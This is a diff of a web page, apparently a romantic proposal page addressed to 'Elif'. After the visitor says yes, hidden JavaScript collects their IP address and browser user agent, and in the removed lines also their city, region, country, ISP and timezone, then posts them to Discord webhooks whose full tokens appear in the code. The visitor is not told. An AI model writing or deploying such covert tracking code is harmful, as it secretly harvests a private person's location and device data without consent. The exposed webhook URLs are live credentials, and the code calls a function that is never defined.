@@ -148,31 +148,29 @@
       document.getElementById('finalMessage').style.display = 'block';
       startEmojiRain('💖');
 
-      fetch('https://discord.com/api/webhooks/1399043521071022150/y2piq_yz1_KP8CoKrFBmhfUQc7KkvcsNiTKCrirERp0JksSv6--9ty3KGonPQr6dhUZs', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      content: `💖 Elif evet dedi!`
-    })
-  });
+      const webhookURL = 'https://discord.com/api/webhooks/1399043521071022150/y2piq_yz1_KP8CoKrFBmhfUQc7KkvcsNiTKCrirERp0JksSv6--9ty3KGonPQr6dhUZs'; // Buraya doğru URL koy
 
-  fetch('http://ip-api.com/json/')
-  .then(res => res.json())
-  .then(data => {
-    const info = `
-      📡 IP: ${data.query}
-      🌍 Şehir: ${data.city}
-      🏙 Bölge: ${data.regionName}
-      🗺 Ülke: ${data.country}
-      🌐 ISP: ${data.isp}
-      🕒 Saat Dilimi: ${data.timezone}
-    `;
-    fetch('https://discord.com/api/webhooks/1399044079588999178/urg8mH6BxFzuq5W35ngl_1rO6LXO7MqXzQ--nJfbNIsgVme0NOIUb3k0io3r5ew0kDTd', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ content: info })
+  const deviceInfo = navigator.userAgent;
+
+  sendWebhookMessage(webhookURL, `💖 Elif evet dedi! Cihaz: ${deviceInfo}`)
+
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      const deviceInfo = navigator.userAgent;
+      const info = `
+💖 Elif evet dedi!
+📡 IP: ${data.ip}
+💻 Cihaz & Tarayıcı: ${deviceInfo}
+      `;
+      // Webhook çağrısı (bazı webhooklar CORS engeli yapabilir)
+      fetch('https://discord.com/api/webhooks/1399044079588999178/urg8mH6BxFzuq5W35ngl_1rO6LXO7MqXzQ--nJfbNIsgVme0NOIUb3k0io3r5ew0kDTdL', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: info })
+      }).catch(err => console.log('Webhook gönderilemedi:', err));
     });
-  });
+}
 
 
     }
